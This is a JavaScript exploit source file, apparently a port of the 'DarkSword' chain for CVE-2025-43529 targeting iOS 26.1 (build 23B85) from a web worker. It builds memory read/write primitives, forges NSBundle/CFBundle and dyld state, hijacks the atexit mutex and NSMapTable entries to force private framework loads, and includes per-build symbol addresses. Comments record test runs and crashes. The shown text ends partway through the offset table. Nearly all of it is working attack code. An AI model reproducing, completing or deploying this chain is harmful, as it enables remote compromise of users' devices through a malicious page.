let MessageName;
const convBuf = new ArrayBuffer(8);
const u8 = new Uint8Array(convBuf);
const u32 = new Uint32Array(convBuf);
const u64 = new BigUint64Array(convBuf);
const f64 = new Float64Array(convBuf);
p = {};
var p_rce = {
    _root: []
};

function itof(value) {
    u64[0] = BigInt.asUintN(64, value);
    return f64[0];
}
function ftoi(value) {
    f64[0] = value;
    return u64[0];
}
function hex(value) {
    if (typeof value !== "bigint") return String(value);
    return "0x" + value.toString(16);
}
function noPAC(value) {
    return value & 0x7fffffffffn;
}

BigUint64Array.prototype.data = function () { return p.read64(p.addrof(this) + 0x10n); };

// Synchronous logger: blocks the worker (sync XHR) until the server has written the line, so the
// log right before a crash/hang is guaranteed delivered AND in exact order -- unlike postMessage ->
// Image beacon, which is async and reorders/drops. Drop slog("reached X") anywhere to pin the exact
// execution point. Server origin is injected as self.__SLOG_ORIGIN by the harness (falls back to
// postMessage if unavailable, e.g. running standalone).

function slog(msg) {
    // async + circuit breaker: a dead/hung log server must NEVER stall the dance (sync XHR to a
    // hung socket blocks the worker for the full TCP timeout). Lines keep sequence numbers (t=n)
    // so order is reconstructable; if the server is unreachable we mirror to the page instead.
    const n = (slog._n = (slog._n || 0) + 1);
    if (slog._dead) { try { postMessage("[slog] " + msg); } catch (_) { } return; }
    try {
        const line = encodeURIComponent(("#" + n + " " + String(msg)).slice(0, 400));
        const x = new XMLHttpRequest();
        x.open("GET", (self.__SLOG_ORIGIN || "") + "/log?kind=slog&t=" + n + "&msg=" + line, true);
        x.onerror = () => { slog._dead = true; try { postMessage("[slog] server unreachable -- mirroring to page"); } catch (_) { } };
        x.send();
    } catch (e) {
        slog._dead = true;
        try { postMessage("[slog] " + msg); } catch (_) { }
    }
}

class Encoder {
    constructor(messageName, destinationID) {
        this.argList = [];
        if (arguments.length) {
            this.messageName = messageName;
            this.destinationID = destinationID;
            this.encode('uint8_t', 0);
            this.encode('uint16_t', this.messageName);
            this.encode('uint64_t', this.destinationID);
        }
    }
    encode(type, value) {
        this.argList.push({
            type,
            value
        });
        return this;
    }
    encode8BitString(str) {
        this.encode('uint32_t', str.length);
        this.encode('bool', true);
        this.argList.push({
            type: 'bytes',
            value: str
        });
        return this;
    }
    encodeNullString() {
        this.encode('uint32_t', 0xffffffff);
        return this;
    }
    static argumentAlignment(arg) {
        switch (arg.type) {
            case 'uint64_t':
            case 'int64_t':
                return 8;
            case 'uint32_t':
            case 'int32_t':
            case 'float':
                return 4;
            case 'uint16_t':
            case 'int16_t':
                return 2;
            case 'uint8_t':
            case 'int8_t':
            case 'bool':
                return 1;
            case 'bytes':
                return 0;
            default:
                ASSERT_NOT_REACHED(`Encoder.argumentAlignment(): unexpected type name: ${arg.type}`);
        }
    }
    static argumentSize(arg) {
        switch (arg.type) {
            case 'uint64_t':
            case 'int64_t':
                return 8;
            case 'uint32_t':
            case 'int32_t':
            case 'float':
                return 4;
            case 'uint16_t':
            case 'int16_t':
                return 2;
            case 'uint8_t':
            case 'int8_t':
            case 'bool':
                return 1;
            case 'bytes':
                if (typeof arg.value == 'string') {
                    return arg.value.length;
                } else {
                    return arg.value.byteLength;
                }
            default:
                ASSERT_NOT_REACHED(`argumentSize(): unexpected type name: ${arg.type}`);
        }
    }
    buffer() {
        if (this.__buffer) return this.__buffer;
        let bufferSize = 0;
        for (const arg of this.argList) {
            const alignment = Encoder.argumentAlignment(arg);
            const remainder = bufferSize % alignment;
            if (remainder) {
                bufferSize += alignment - remainder;
            }
            bufferSize += Encoder.argumentSize(arg);
        }
        const buffer = new ArrayBuffer(bufferSize);
        const view = new DataView(buffer);
        let bufferOffset = 0;
        for (const arg of this.argList) {
            const alignment = Encoder.argumentAlignment(arg);
            const remainder = bufferOffset % alignment;
            if (remainder) {
                bufferOffset += alignment - remainder;
            }
            switch (arg.type) {
                case 'float':
                    view.setFloat32(bufferOffset, arg.value, true);
                    break;
                case 'uint64_t':
                    view.setBigUint64(bufferOffset, arg.value, true);
                    break;
                case 'int64_t':
                    view.setBigInt64(bufferOffset, arg.value, true);
                    break;
                case 'uint32_t':
                    view.setUint32(bufferOffset, arg.value, true);
                    break;
                case 'int32_t':
                    view.setInt32(bufferOffset, arg.value, true);
                    break;
                case 'uint16_t':
                    view.setUint16(bufferOffset, arg.value, true);
                    break;
                case 'int16_t':
                    view.setInt16(bufferOffset, arg.value, true);
                    break;
                case 'uint8_t':
                    view.setUint8(bufferOffset, arg.value);
                    break;
                case 'int8_t':
                    view.setInt8(bufferOffset, arg.value);
                    break;
                case 'bool':
                    view.setInt8(bufferOffset, !!arg.value);
                    break;
                case 'bytes':
                    const buffer_u8 = new Uint8Array(buffer);
                    if (typeof arg.value == 'string') {
                        for (let i = 0; i < arg.value.length; ++i) buffer_u8[bufferOffset + i] = arg.value.charCodeAt(i);
                    } else {
                        for (let i = 0; i < arg.value.byteLength; ++i) buffer_u8[bufferOffset + i] = arg.value[i];
                    }
                    break;
                default:
                    ASSERT_NOT_REACHED(`buffer(): unexpected type name: ${arg.type}`);
            }
            bufferOffset += Encoder.argumentSize(arg);
        }
        return this.__buffer = buffer;
    }
};
const canvas = new OffscreenCanvas(64, 64);
// "pass" the atexit mutex: let the main-worker load's ___cxa_atexit acquire+release WITHOUT
// parking, while PRESERVING the kernel waiter-count (bit 0x100). Writing a bare 0x00 clears
// that count, so the release takes the no-waiters userspace fast-path and never issues the
// kernel wake -> the parked dlopen-worker is never resumed, its dlopen_from never finalizes,
// and the hijacked-loader interpose write never fires (both worker1 buffer AND worker2 size
// stay stale). Clearing only the low-byte held flags keeps us unlocked (0x00-equivalent, no
// freeze) but retains the waiter so the release wakes the parked worker. No-op when nothing
// is parked (early stage4 load: 0x00 & ~0xff = 0x00, no phantom waiter). DarkSword kept the
// count via 0x101 (18.6 flag layout); on 26.1 the held-bit is 0x02 (bit0 = kernel ulock-allocated
// flag, so a cycling mutex reads 0x01/0x03), so we clear the low byte. NOTE (verified vs 23B85
// libsystem_pthread): 0x100 is the low-half waiter-COUNT unit; a waking release bumps the HIGH-half
// wake-generation by the same unit, so after a real wake the word rests at 0x0000010000000100 and a
// later release will NOT wake again (low count == high count). armAtexitPass() (read & ~0xff)
// therefore CANNOT re-arm after a genuine wake -- re-arming requires zeroing the high half (the wake
// loops' explicit write64(atexitState, 0x100)); seeing 0x10000000100 flat-line is proof a wake fired.
function armAtexitPass() {
    const a = offsets.libsystem_c__atexit_mutex + structs.Atexit_mutexState;
    p.write64(a, p.read64(a) & ~0xffn);
}

async function loadObjcClass(cls) {
        if (!p.silentLoad) armAtexitPass();

    const cx = canvas.getContext('2d', { willReadFrequently: true });
    cx.fillStyle = '#f00';
    cx.fillRect(0, 0, 64, 64);
    const bitmap = await createImageBitmap(canvas);
    const ab = p.addrof(bitmap);
    slog(`[loadObjcClass cls=${hex(cls)}] addrof(bitmap)=${hex(ab)}`);
    const wrappedBitmap = p.read64(ab + p.structs.JSImageBitmap_wrapped);
    const imagebuffer = p.read64(wrappedBitmap + p.structs.ImageBitmap_buffer);
    p.write64(imagebuffer + p.structs.ImageBuffer_objcClass, cls);
    slog(`[loadObjcClass] class planted; close()...`);
    bitmap.close();
    // park-next write (0x03 = fake-held for the NEXT worker's __cxa_atexit). SUPPRESSED during wake
    // broadcasts (p.noAtexitPark): a wake load must leave the mutex unheld, or the woken worker's
    // re-acquire sees held and re-parks -- the wake dies. The stage5/6 tails park explicitly later.
    if (!p.noAtexitPark) p.write64(offsets.libsystem_c__atexit_mutex + structs.Atexit_mutexState, 0x03n);
}

// Synchronous web-feature dlopens (the writeup's "alternative path"): each of these makes WebCore
// synchronously dlopen a fresh framework through PAL::softLink / ImageIO on THIS thread -- no
// NSBundle, no TT._lock -- and the fresh image's ___cxa_atexit release broadcasts on the atexit
// mutex. With the waiter bit armed, that is the wake. Worker-safe subset only (no window APIs).
function pumpSoftlink() {
    try { new VideoDecoder({ output() { }, error() { } }).configure({ codec: 'avc1.42001f', optimizeForLatency: true }); } catch (e) { }
    try { new VideoDecoder({ output() { }, error() { } }).configure({ codec: 'hev1.1.6.L120.90', optimizeForLatency: true }); } catch (e) { }
    try { new VideoEncoder({ output() { }, error() { } }).configure({ codec: 'avc1.42001f', width: 64, height: 64, bitrate: 100000, framerate: 10 }); } catch (e) { }
    try { new AudioDecoder({ output() { }, error() { } }).configure({ codec: 'mp4a.40.2' }); } catch (e) { }
    try { new AudioDecoder({ output() { }, error() { } }).configure({ codec: 'opus' }); } catch (e) { }
    try { new AudioEncoder({ output() { }, error() { } }).configure({ codec: 'mp4a.40.2', sampleRate: 8000, numberOfChannels: 1, bitrate: 8000 }); } catch (e) { }
    try { new BarcodeDetector({ formats: ['qr_code'] }); } catch (e) { }          // Vision.framework
    try { BarcodeDetector.getSupportedFormats(); } catch (e) { }
    try { new OffscreenCanvas(8, 8).convertToBlob({ type: 'image/heic' }); } catch (e) { }   // ImageIO encoder plugins
    try { new OffscreenCanvas(8, 8).convertToBlob({ type: 'image/avif' }); } catch (e) { }
    try { const cx = new OffscreenCanvas(32, 32).getContext('2d'); cx.filter = 'blur(2px)'; cx.fillStyle = '#f00'; cx.fillRect(0, 0, 32, 32); } catch (e) { }   // CoreImage.framework (canvas 2d filter, http-safe, worker-safe)
}

// --- instrumented probe battery (run 260719_014753: pump v3 + WAKE_CLASS produced ZERO
// __cxa_atexit activity in 12M spins). Two facts established post-mortem: (1) most pump calls are
// SECURE-CONTEXT APIs (VideoDecoder/BarcodeDetector/SpeechRecognition) which are `undefined` over
// plain http on a LAN origin -- the try/catch swallowed it, so the pump was likely a NO-OP; (2) the
// WAKE_CLASS plant of PKContact triggered no loader at all (loadObjcClass only rides the
// AVFAudio->TextToSpeech deferred loader; the planted class is just the trigger).
// pumpProbe() runs each candidate with BEFORE/AFTER reads of dyld's loaded-image count
// (RuntimeState.loaded.size @ +0x30) and the atexit word, so the NEXT run log shows exactly which
// call (if any) performs a fresh in-process dlopen on this vphone. Winners are remembered in
// p.pumpWinners and re-fired every 3M spins inside the wake loops.
function dyldLoadedCount() { try { return p.read64(p.runtimeState + 0x30n); } catch (e) { return 0xffffn; } }
function pumpProbe() {
    const A = offsets.libsystem_c__atexit_mutex + structs.Atexit_mutexState;
    const winners = [];
    postMessage(`[probe] typeof VD=${typeof VideoDecoder} VE=${typeof VideoEncoder} AD=${typeof AudioDecoder} AE=${typeof AudioEncoder} BD=${typeof BarcodeDetector} FF=${typeof FontFace} AC=${typeof AudioContext} OC=${typeof OffscreenCanvas}`);
    const probe = (name, fn) => {
        const l0 = dyldLoadedCount(), a0 = p.read64(A);
        let err = '';
        try { fn(); } catch (e) { err = ' ERR:' + (e && (e.message || e)); }
        const l1 = dyldLoadedCount(), a1 = p.read64(A);
        postMessage(`[probe] ${name}: loaded ${l0}->${l1} atexit ${hex(a0)}->${hex(a1)}${err}`);
        if (l1 !== l0 && l1 !== 0xffffn) winners.push(fn);   // fresh load happened -> re-fire this one
    };
    probe('VideoDecoder-h264', () => { new VideoDecoder({ output() { }, error() { } }).configure({ codec: 'avc1.42001f', optimizeForLatency: true }); });
    probe('BarcodeDetector', () => { new BarcodeDetector({ formats: ['qr_code'] }); });
    probe('canvas-filter-CoreImage', () => { const cx = new OffscreenCanvas(32, 32).getContext('2d'); cx.filter = 'blur(2px)'; cx.fillStyle = '#f00'; cx.fillRect(0, 0, 32, 32); });
    probe('convertToBlob-heic', () => { new OffscreenCanvas(8, 8).convertToBlob({ type: 'image/heic' }); });
    probe('createImageBitmap-jxl', () => { /* placeholder: no JXL blob embedded; skip */ });
    probe('AudioContext', () => { const AC = self.AudioContext || self.webkitAudioContext; if (!p.__probeAC) p.__probeAC = new AC(); });
    p.pumpWinners = winners;
    postMessage(`[probe] winners=${p.pumpWinners.length} loadedCount=${dyldLoadedCount()} (if 0: nothing JS-reachable loads a fresh framework on this origin -- need https or a second deferred-loader pair)`);
}
function pumpRefireWinners() {
    if (!p.pumpWinners) return;
    for (const fn of p.pumpWinners) { try { fn(); } catch (e) { } }
}

// =====================================================================
// Deterministic broadcast wakes (2026-07-19, from extracted/deferred-loader-pairs.md):
// JS-reachable fresh loads are exhausted on this device (run 022451: loadedCount=1539, winners=0),
// and the AVFAudio->TextToSpeech loader always takes TT._lock (abort vs worker's stale unlock).
// The wake therefore comes from PLANTING a class whose +initialize loads a FRESH framework with
// no TT._lock involvement:
//   1. UIManagedDocument (UIKitCore, always loaded) +initialize -> dlopen(CoreData) DIRECTLY,
//      no NSBundle, no lock. Class = 0x1ee3f9980.
//   2. GCEventInteraction (GameController) +initialize -> NSBundle load of GameControllerUI on
//      its OWN bundle lock. Class = 0x1edecf130. Prereq: GameController.framework loaded (done
//      silently through the TT bundle with atexit=0 -- safe: worker is parked, no wake armed).
//   3. AVVCMetricsManager (AVFAudio, loaded by stage4) -init -> dlopen(libAudioIssueDetector).
//      Works only if the plant fully instantiates (not just +initialize) -- self-diagnosing.
// fireWakeTarget() logs the dyld loaded-image delta, so a target that produced no load is
// abandoned automatically; targets that fired once are SPENT (a loaded framework never re-fires
// __cxa_atexit). Stages share one cursor (p.wakeTargetIdx) so stage6 continues past stage5's spent
// targets. The 0x03 park-write in loadObjcClass is SUPPRESSED during wake broadcasts
// (p.noAtexitPark) -- it would re-lock the atexit mutex in the woken worker's face.
function initWakeTargets() {
    if (p.wakeTargets) return;
    p.wakeTargets = [
        { name: 'CoreData via UIManagedDocument', cls: offsets.UIKitCore__OBJC_CLASS__UIManagedDocument },
        { name: 'ManagedConfiguration via LSApplicationRestrictionsManager', cls: offsets.CoreServices__OBJC_CLASS__LSApplicationRestrictionsManager },
        {
            name: 'GameControllerUI via GCEventInteraction', cls: offsets.GameController__OBJC_CLASS__GCEventInteraction,
            prereq: '/System/Library/Frameworks/GameController.framework/GameController'
        },
        { name: 'libAudioIssueDetector via AVVCMetricsManager', cls: offsets.AVFAudio__OBJC_CLASS__AVVCMetricsManager },
    ];
    if (p.wakeTargetIdx === undefined) p.wakeTargetIdx = 0;
}
function nextWakeTarget() {
    initWakeTargets();
    while (p.wakeTargetIdx < p.wakeTargets.length) {
        const t = p.wakeTargets[p.wakeTargetIdx++];
        if (!t.spent) return t;
    }
    return null;
}
async function loadPrereqSilently(path, lockAddr, tok) {
    postMessage(`[wake] silent TT-load of prereq: ${path}`);
    const cs = p.makeCString(path);
    p.write64(offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken, 0n);
    p.write64(p.TextToSpeech_NSBundle + structs.NSBundle_lock, 0n);
    p.write64(p.runtimeStateLock + structs.RuntimeStateLock_word, 0n);
    p.write64(p.TextToSpeech_NSBundle + structs.NSBundle_flags, 0x40008n);
    p.write8(p.TextToSpeech_CFBundle + structs.CFBundle_loadedFlag, 0n);
    p.write64(offsets.CFNetwork__gConstantCFStringValueTable + structs.CFString_dataPtr, cs.ptr);
    p.write64(offsets.CFNetwork__gConstantCFStringValueTable + structs.CFString_length, cs.len);
    p.write64(offsets.libsystem_c__atexit_mutex + structs.Atexit_mutexState, 0n);
    p.silentLoad = true;
    await loadObjcClass(nextAVSpeechClass());
    p.silentLoad = false;
    // the silent load cycled TT._lock through chain_tok -> 0; restore the seed so the parked
    // worker's stale unlock stays legal.
    p.write32le(lockAddr, tok);
}
async function fireWakeTarget(t, lockAddr, tok) {
    p.noAtexitPark = true;
    try {
        if (t.prereq && !t.prereqDone) {
            await loadPrereqSilently(t.prereq, lockAddr, tok);
            t.prereqDone = true;
        }
        const l0 = dyldLoadedCount();
        p.write64(offsets.libsystem_c__atexit_mutex + structs.Atexit_mutexState, 0x100n);
        try { await loadObjcClass(t.cls); } catch (e) { postMessage(`[wake] ${t.name} ERR ${e && (e.message || e)}`); }
        const l1 = dyldLoadedCount();
        t.spent = (l1 !== l0);
        postMessage(`[wake] fired ${t.name}: loaded ${l0}->${l1}${t.spent ? ' SPENT' : ' (no fresh load -- will try next target)'}`);
        p.write64(offsets.libsystem_c__atexit_mutex + structs.Atexit_mutexState, 0x100n);  // re-arm for the next broadcast
    } finally {
        p.noAtexitPark = false;
    }
}

// The AVFAudio loader lives in the +initialize of 7 AVSpeech* classes, and +initialize fires ONCE
// per class EVER -- a reused class fires NOTHING (this was the 052941 failure: the wake used
// Voice, already spent by stage5's silent load, so the loader never ran). Also the loader's
// +initialize stub early-returns when its onceToken==-1, so every fire must RESET the token
// (same as rearmCFBundleLoader does for the park loads). ProviderRequest/Voice/Utterance are
// consumed by stage4/stage5/stage6 and Marker is reserved for worker2's park -- the wake pool:
const AV_SPEECH_WAKE_POOL = [
    'AVFAudio__OBJC_CLASS__AVSpeechSynthesizer',
    'AVFAudio__OBJC_CLASS__AVSpeechSynthesisProviderVoice',
    'AVFAudio__OBJC_CLASS__AVSpeechSynthesisProviderAudioUnit',
];
function nextAVSpeechClass() {
    const i = (p.avSpeechWakeIdx = (p.avSpeechWakeIdx ?? 0) + 1) - 1;
    return offsets[AV_SPEECH_WAKE_POOL[i % AV_SPEECH_WAKE_POOL.length]];
}

// ================= NSMapTable redirect wake (PRIMARY wake mechanism, 2026-07-19) =================
// bundleWithPath: consults ONLY the _resolvedPathToBundles NSMapTable (tables+0x28; layout:
// parallel flat key/value arrays at ivar offsets stored in globals -- bundleWithPath-and-round2.md).
// Swapping the TTS entry's VALUE to a CLONED bundle (own lock word, re-armed cloned CFBundle with a
// fresh forged execPath) makes the proven AVSpeech plant load ANY fresh framework through the
// CLONE's lock: TT._lock never leaves the parked worker's token, so its stale unlock is always
// legal. The TTS entry is found by VALUE (we know the TT bundle pointer) -- no string reads.
// The original value is restored after every fire (stage6's park loads need the real TT bundle).
function tableMapInfo() {
    const tables = p.read64(offsets.Foundation__NSBundleTables_bundleTables_value);
    const map = p.read64(tables + 0x28n);
    return {
        map,
        count: p.read64(map + BigInt(p.read32(offsets.NSConcreteMapTable_countOff))),
        keys: p.read64(map + BigInt(p.read32(offsets.NSConcreteMapTable_keysOff))),
        values: p.read64(map + BigInt(p.read32(offsets.NSConcreteMapTable_valuesOff))),
    };
}
function setupMapRedirect() {
    if (p.mapRedir) return p.mapRedir;
    const { count, values } = tableMapInfo();
    let ttSlot = 0n, ttOrig = 0n, borrow = 0n, borrowIdx = -1n;
    for (let i = 0n; i < count; ++i) {
        const v = p.read64(values + i * 8n);
        if (v === p.TextToSpeech_NSBundle) { ttSlot = values + i * 8n; ttOrig = v; }
        else if (!borrow && v > 0x100000000n && p.read64(v + structs.NSBundle_cfBundle) !== 0n) { borrow = v; borrowIdx = i; }
    }
    if (!ttSlot) { postMessage('[mapredir] TT bundle NOT in _resolvedPathToBundles'); return null; }
    if (!borrow) { postMessage('[mapredir] no borrowable bundle found (need one WITH a CFBundle)'); return null; }
    const borrowCF = p.read64(borrow + structs.NSBundle_cfBundle);
    p.mapRedir = {
        slot: ttSlot, orig: ttOrig, borrow, borrowIdx, borrowCF,
        savedFlags: p.read64(borrow + structs.NSBundle_flags),
        savedExec: p.read64(borrowCF + structs.CFBundle_execPath),
    };
    postMessage(`[mapredir] armed: ttSlot=${hex(ttSlot)} orig=${hex(ttOrig)} borrow=${hex(borrow)} (idx ${borrowIdx}) cf=${hex(borrowCF)}`);
    return p.mapRedir;
}
function readCString(addr, maxLen) {
    let s = '';
    for (let i = 0n; i < BigInt(maxLen); i += 8n) {
        const c = p.read64(addr + i);
        for (let j = 0n; j < 8n; j++) {
            const b = Number((c >> (j * 8n)) & 0xffn);
            if (b === 0) return s;
            s += String.fromCharCode(b);
        }
    }
    return s;
}
// fire autopsy: pinpoint WHERE the borrowed-bundle wake stops (run-260719_105947 fired but
// produced zero load, no crash). Reads, right after the plant's close():
//   onceToken  -1 = the AVFAudio loader block RAN (0 = trigger never fired -> plant problem)
//   borrow.path = the borrowed bundle's identity (is it a proper loaded-framework bundle?)
//   cf.loaded  1 = CFBundleLoadExecutable RAN (0 = it never got there: isLoaded skipped, or the
//              loader resolved something else; 0 + count-delta>0 = the load errored)
//   borrow.isa, borrow.flags, cf.exec = sanity on our re-arm landing
function fireAutopsy(mr, l0) {
    try {
        const tok = p.read64(offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken);
        const cfNow = p.read64(mr.borrow + structs.NSBundle_cfBundle);
        const cfLoaded = p.read64(cfNow + structs.CFBundle_loadedFlag) & 0xffn;
        const cfExec = p.read64(cfNow + structs.CFBundle_execPath);
        const flags = p.read64(mr.borrow + structs.NSBundle_flags);
        let bpath = '?';
        try {
            const ip = p.read64(mr.borrow + structs.NSBundle_initialPath);
            if (ip > 0x100000000n) bpath = readCString(p.read64(ip + structs.CFString_dataPtr), 96);
        } catch (e) { }
        postMessage(`[mapredir] autopsy: onceToken=${hex(tok)} (want -1=block ran) borrow.path="${bpath}" cf.loaded=${cfLoaded} cf.exec=${hex(cfExec)} flags=${hex(flags)} loadedNow=${dyldLoadedCount()} (was ${l0})`);
    } catch (e) { postMessage(`[mapredir] autopsy ERR ${e && (e.message || e)}`); }
}
async function wakeViaMapRedirect(path, tok) {
    const mr = setupMapRedirect();
    if (!mr) return false;
    const cs = p.makeCString(path);
    // forge the exec path into the shared value-table CFString (a REAL object -- no autda issue),
    // same recipe as rearmCFBundleLoader. NOTE: the real TT CFBundle's execPath also points here,
    // but worker1's park path was already consumed by its in-flight dlopen.
    p.write64(offsets.CFNetwork__gConstantCFStringValueTable + structs.CFString_dataPtr, cs.ptr);
    p.write64(offsets.CFNetwork__gConstantCFStringValueTable + structs.CFString_length, cs.len);
    p.write64(mr.borrowCF + structs.CFBundle_execPath, offsets.CFNetwork__gConstantCFStringValueTable);
    p.write8(mr.borrowCF + structs.CFBundle_loadedFlag, 0n);
    p.write64(mr.borrow + structs.NSBundle_flags, 0x40008n);     // not-loaded state
    p.write64(mr.borrow + structs.NSBundle_lock, 0n);
    const l0 = dyldLoadedCount();
    p.write64(mr.slot, mr.borrow);                                  // TTS path -> borrowed REAL bundle
    p.noAtexitPark = true;
    p.write64(offsets.libsystem_c__atexit_mutex + structs.Atexit_mutexState, 0x100n);
    p.write64(offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken, 0n);  // loader +initialize stub early-rets on -1
    const wakeCls = nextAVSpeechClass();                            // FRESH class -- +initialize fires once per class ever
    postMessage(`[mapredir] firing plant ${hex(wakeCls)}`);
    try { await loadObjcClass(wakeCls); }
    catch (e) { postMessage(`[mapredir] wake ERR ${e && (e.message || e)}`); }
    // dispatch_once gate SEED (crash 091458 fix): on 26.1 the in-progress onceToken is the
    // running thread's mach port (tsd+0x18 & ~3), and the completing block asserts OLD==own port
    // ("lock not owned by current thread"). The parked worker is INSIDE this dispatch_once block
    // and will release it on completion -- seed the token with ITS port so that release is legal.
    // (Our own fire just released the gate cleanly, OLD==chain port.) The next fire re-zeros.
    p.write64(offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken, BigInt(tok) & ~3n);
    fireAutopsy(mr, l0);
    p.noAtexitPark = false;
    p.write64(mr.slot, mr.orig);                                    // restore real TT bundle
    p.write64(mr.borrow + structs.NSBundle_flags, mr.savedFlags);   // restore borrowed bundle
    p.write64(mr.borrowCF + structs.CFBundle_execPath, mr.savedExec);
    p.write8(mr.borrowCF + structs.CFBundle_loadedFlag, 1n);
    const l1 = dyldLoadedCount();
    postMessage(`[mapredir] wake via ${path}: loaded ${l0}->${l1}`);
    p.write64(offsets.libsystem_c__atexit_mutex + structs.Atexit_mutexState, 0x100n);
    return l1 !== l0;
}
// Ordered fresh-path queue (both stages draw from it; each fire must produce NEW images or we
// advance). run-260719_120258 autopsy: the redirect itself WORKS (cf.loaded=1, bundle marked
// loaded) but AppleCV3D was already resident -> zero new images. Ranked YES+likely-fresh queue
// from extracted/atexit-wake-paths-wide.md (74 YES of 4191 images, reverse-importer screened).
const WAKE_PATHS = [
    '/System/Library/PrivateFrameworks/XGBoostFramework.framework/XGBoostFramework',           // 33 inits, only CreateMLComponents imports it -- PROVEN to load+wake worker1
    // The C++-native family (the family XGBoost proved loads cleanly in WebContent). The
    // XOJIT-family below all failed to load in WebContent (run 131246 stage6: cf.loaded=0,
    // loadedNow flat for every one) -- likely JIT/entitlement-restricted, kept only as last resorts.
    '/System/Library/PrivateFrameworks/TuriCore.framework/TuriCore',                            // 918 inits, CreateML only (XGBoost family)
    '/System/Library/PrivateFrameworks/MacinTalk.framework/MacinTalk',                          // 3 inits, nothing links it
    '/System/Library/PrivateFrameworks/ProVideo.framework/ProVideo',                            // 6 inits, CameraEffectsKit
    '/System/Library/PrivateFrameworks/CorePhotogrammetry.framework/CorePhotogrammetry',        // 3 inits, CoreOC
    '/System/Library/PrivateFrameworks/GPUCompiler.framework/Libraries/libGPUCompilerImpl.dylib', // 19 inits YES -- RESIDENT on this vphone (first fire completes with no new image)
    '/System/Library/PrivateFrameworks/XOJIT.framework/XOJIT',                                  // 71 inits, PreviewShellKit only -- failed to load
    '/System/Library/PrivateFrameworks/ObjectUnderstanding.framework/ObjectUnderstanding',      // 24 inits -- failed to load
    '/System/Library/PrivateFrameworks/IntelligenceEngine.framework/IntelligenceEngine',        // 17 inits, SiriKitFlow only -- failed to load
    '/System/Library/PrivateFrameworks/CoreIndoor.framework/CoreIndoor',                        // 17 inits, nothing links it -- failed to load
    '/System/Library/PrivateFrameworks/DialogEngine.framework/DialogEngine',                    // 10 inits, Siri stack -- failed to load
    '/System/Library/PrivateFrameworks/AppleCV3D.framework/AppleCV3D',                          // resident on this vphone (kept as proof the queue advances)
];
async function fireNextWakePath(tok) {
    while (true) {
        const i = (p.wakePathIdx = (p.wakePathIdx ?? 0) + 1) - 1;
        if (i >= WAKE_PATHS.length) {
            postMessage('[mapredir] wake-path queue EXHAUSTED (all produced no new images)');
            return false;
        }
        postMessage(`[mapredir] wake path ${i}: ${WAKE_PATHS[i]}`);
        if (await wakeViaMapRedirect(WAKE_PATHS[i], tok)) return true;
    }
}


let slow_fcall_resolve;

function bigintFromBytes(bytes) {
    for (let i = 0; i < 8; ++i) u8[i] = bytes[i];
    return u64[0];
}

// =====================================================================
//  CVE-2025-43529 exploit chain  (iOS 26.1 / build 23B85)  -- port of DarkSword
//
//  Stage layout (each is its own onmessage case so the main thread can
//  orchestrate the later, multi-worker stages):
//    stage1 : UAF -> addrof/fakeobj -> scribble -> arbitrary read64/write64,
//             then immediately disable GC so the fake cells survive. Everything is
//             parked in the global `p` object so later stages (and later workers)
//             can reuse it.
//    stage2 : leak the JSC slide, open the JIT allowlist, and locate the worker
//             contexts -- all on top of p.read64/p.write64.
//    stage3+: dlopen-worker dance + dyld-interposing PAC bypass (not yet ported)
//
//  THIS HAS TO RUN IN A WEB WORKER so the scope is added to
//  WebCore::allScriptExecutionContextsMap (stage2 walks that map).
// =====================================================================

// =====================================================================
//  Per-build offset tables. Select the target with TARGET_BUILD below.
//    syms    = absolute (un-slid) symbol VAs from the dyld_shared_cache
//    structs = C++/JSC struct field offsets (object layout, per build)
//  Everything version-specific lives here so the chain stays portable:
//  to retarget another iOS build, add a sibling key and fill both tables.
// =====================================================================
const VERSIONS = {
    // iOS 26.1  /  build 23B85  /  iPhone17,3  (vphone target)
    "23B85": {
        syms: {
            "__pthread_head": 0x1ed3f8020n,
            "AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken": 0x1ed745410n,
            "AVFAudio__OBJC_CLASS__AVSpeechSynthesisMarker": 0x1ed744f30n,
            "AVFAudio__OBJC_CLASS__AVSpeechSynthesisProviderRequest": 0x1ed744e68n,
            "AVFAudio__OBJC_CLASS__AVSpeechSynthesisVoice": 0x1ed744f08n,
            "AVFAudio__OBJC_CLASS__AVSpeechUtterance": 0x1ed744300n,
            "AVFAudio__OBJC_CLASS__AVSpeechSynthesizer": 0x1ed744df0n, // wake pool (fresh +initialize class)
            "AVFAudio__OBJC_CLASS__AVSpeechSynthesisProviderVoice": 0x1ed7450e8n, // wake pool
            "AVFAudio__OBJC_CLASS__AVSpeechSynthesisProviderAudioUnit": 0x1ed745070n, // wake pool
            "AVFAudio__OBJC_CLASS__AVVCMetricsManager": 0x1ed744918n, // wake target 3: -init -> dlopen(libAudioIssueDetector) (deferred-loader-pairs.md (c))
            "AXCoreUtilities__DefaultLoader": 0x1ed5a8748n,
            "CFNetwork__gConstantCFStringValueTable": 0x1ee5a9570n,
            "CMPhoto__kCMPhotoTranscodeOption_Strips": 0x1e77a3028n,
            // CMPhoto interpose replacees for check_dlopen2/stage6 (resolved for 23B85 via dsc symaddr 2026-07-11; cache validated against known offsets)
            "CMPhoto__CMPhotoCompressionCreateContainerFromImageExt": 0x1a5a87078n,
            "CMPhoto__CMPhotoCompressionCreateDataContainerFromImage": 0x1a5a87228n,
            "CMPhoto__CMPhotoCompressionSessionAddAuxiliaryImage": 0x1a5a4a570n,
            "CMPhoto__CMPhotoCompressionSessionAddAuxiliaryImageFromDictionaryRepresentation": 0x1a5a4ab94n,
            "CMPhoto__CMPhotoCompressionSessionAddCustomMetadata": 0x1a5a4b2a8n,
            "CMPhoto__CMPhotoCompressionSessionAddExif": 0x1a5a4ace0n,
            "CoreServices__OBJC_CLASS__LSApplicationRestrictionsManager": 0x1ed443e08n, // wake fallback: plain -init -> dlopen(ManagedConfiguration), no NSBundle (round2)
            "CoreServices__LSARM_guard": 0x1ed445110n, // !=0 means LSARM already initialized (target spent)
            "emptyString": 0x1ed794420n,
            "Foundation__NSBundleTables_bundleTables_value": 0x1ed43f9d0n,  // +[__NSBundleTables bundleTables] singleton slot (disasm @0x180777f68; was 0x1ed43ee48 via stale extract_offset)
            "free_slabs": 0x1ed4e4e30n,
            "GameController__OBJC_CLASS__GCEventInteraction": 0x1edecf130n, // wake target 2: +initialize -> NSBundle(GameControllerUI).load, own lock (deferred-loader-pairs.md (b1)); prereq GameController.framework
